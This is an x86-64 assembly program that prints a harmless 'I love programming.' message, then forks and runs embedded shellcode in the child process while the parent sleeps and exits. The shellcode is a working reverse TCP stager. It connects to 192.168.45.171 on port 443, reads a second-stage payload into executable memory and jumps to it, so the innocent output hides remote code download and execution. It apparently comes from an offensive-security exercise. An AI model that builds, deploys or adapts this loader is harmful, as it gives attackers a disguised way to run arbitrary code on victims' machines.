.section .data
msg:
    .ascii "I love programming.\n"

# ======== YOUR SHELLCODE ========
shellcode:
    .byte 0x31,0xff,0x6a,0x09,0x58,0x99,0xb6,0x10,0x48,0x89,0xd6,0x4d
    .byte 0x31,0xc9,0x6a,0x22,0x41,0x5a,0x6a,0x07,0x5a,0x0f,0x05,0x48
    .byte 0x85,0xc0,0x78,0x51,0x6a,0x0a,0x41,0x59,0x50,0x6a,0x29,0x58
    .byte 0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x85,0xc0
    .byte 0x78,0x3b,0x48,0x97,0x48,0xb9,0x02,0x00,0x01,0xbb,0xc0,0xa8
    .byte 0x2d,0xab,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58
    .byte 0x0f,0x05,0x59,0x48,0x85,0xc0,0x79,0x25,0x49,0xff,0xc9,0x74
    .byte 0x18,0x57,0x6a,0x23,0x58,0x6a,0x00,0x6a,0x05,0x48,0x89,0xe7
    .byte 0x48,0x31,0xf6,0x0f,0x05,0x59,0x59,0x5f,0x48,0x85,0xc0,0x79
    .byte 0xc7,0x6a,0x3c,0x58,0x6a,0x01,0x5f,0x0f,0x05,0x5e,0x6a,0x7e
    .byte 0x5a,0x0f,0x05,0x48,0x85,0xc0,0x78,0xed,0xff,0xe6
    # ======== END SHELLCODE ========

.section .text
.globl _start
_start:
    # Output "I love programming."
    mov $1, %rax
    mov $1, %rdi
    lea msg(%rip), %rsi
    mov $20, %rdx
    syscall

    # Fork
    mov $57, %rax
    syscall
    test %rax, %rax
    jz child_process

parent_process:
    # Sleep for 12 seconds and exit with code 3
    mov $35, %rax
    mov $12, %rdi
    syscall
    mov $60, %rax
    mov $3, %rdi
    syscall

child_process:
    # Execute your shellcode
    lea shellcode(%rip), %r11
    jmp *%r11
